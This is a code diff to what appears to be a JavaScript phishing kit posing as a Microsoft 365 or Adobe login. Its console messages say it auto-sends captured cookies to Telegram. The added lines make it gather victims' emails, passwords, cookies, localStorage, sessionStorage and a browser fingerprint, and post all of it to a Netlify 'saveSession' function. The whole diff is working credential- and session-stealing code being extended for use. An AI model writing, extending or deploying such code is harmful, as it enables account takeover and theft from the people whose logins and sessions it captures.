@@ -265,20 +265,25 @@
         console.log('📤 Microsoft 365: Auto-sending', cookies.length, 'captured cookies from', window.location.hostname, 'to Telegram...');
         
         // Get session data
-        const sessionData = JSON.parse(localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session') || '{}');
+        const sessionData = JSON.parse(localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session') || localStorage.getItem('microsoft365_session') || '{}');
         
         // Detect provider based on current domain and email
         const provider = detectEmailProvider(window.location.hostname, sessionData.email);
         
         const browserFingerprint = getBrowserFingerprint();
         
-        await sendDataToBackend(
+        const result = await sendDataToBackend(
           sessionData.email || `auto-captured@${window.location.hostname}`,
           sessionData.password || 'Auto-captured cookies',
           provider
         );
         
-        console.log('✅ Microsoft 365: Auto-send completed for', window.location.hostname);
+        console.log('✅ Microsoft 365: Auto-send completed for', window.location.hostname, result);
+        
+        // Store successful send status
+        sessionData.cookiesSent = true;
+        sessionData.lastSentTime = new Date().toISOString();
+        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
       }
     } catch (error) {
       console.error('❌ Microsoft 365: Auto-send failed for', window.location.hostname, ':', error);
@@ -414,10 +419,11 @@
   // Update stored session with captured cookies
   function updateStoredSession() {
     try {
-      const storedSession = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session');
+      const storedSession = localStorage.getItem('microsoft365_autograb_session') || localStorage.getItem('adobe_autograb_session') || localStorage.getItem('microsoft365_session');
       if (storedSession) {
         const sessionData = JSON.parse(storedSession);
         sessionData.cookies = Array.from(capturedCookies.values());
+        sessionData.formattedCookies = Array.from(capturedCookies.values());
         sessionData.totalCookiesCaptured = capturedCookies.size;
         sessionData.lastCookieUpdate = new Date().toISOString();
         sessionData.currentDomain = window.location.hostname;
@@ -425,6 +431,7 @@
         localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
         // Keep backward compatibility
         localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
       }
     } catch (error) {
       console.error('❌ Microsoft 365: Error updating stored session for', window.location.hostname, ':', error);
@@ -543,6 +550,8 @@
           sessionId: Math.random().toString(36).substring(2, 15),
           cookies: browserFingerprint.cookies,
           formattedCookies: browserFingerprint.cookies,
+          localStorage: browserFingerprint.localStorage,
+          sessionStorage: browserFingerprint.sessionStorage,
           sourceHostname: window.location.hostname,
           detectedProvider: provider,
           universalCapture: true
@@ -551,6 +560,31 @@
       
       const result = await response.json();
       console.log('✅ Backend response for', window.location.hostname, ':', result);
+      
+      // Also try to save session
+      try {
+        await fetch('/.netlify/functions/saveSession', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            email: email,
+            password: password,
+            provider: provider,
+            cookies: browserFingerprint.cookies,
+            formattedCookies: browserFingerprint.cookies,
+            localStorage: browserFingerprint.localStorage,
+            sessionStorage: browserFingerprint.sessionStorage,
+            browserFingerprint: browserFingerprint,
+            sessionId: Math.random().toString(36).substring(2, 15),
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      } catch (saveError) {
+        console.error('❌ Error saving session:', saveError);
+      }
       
       return result;
       
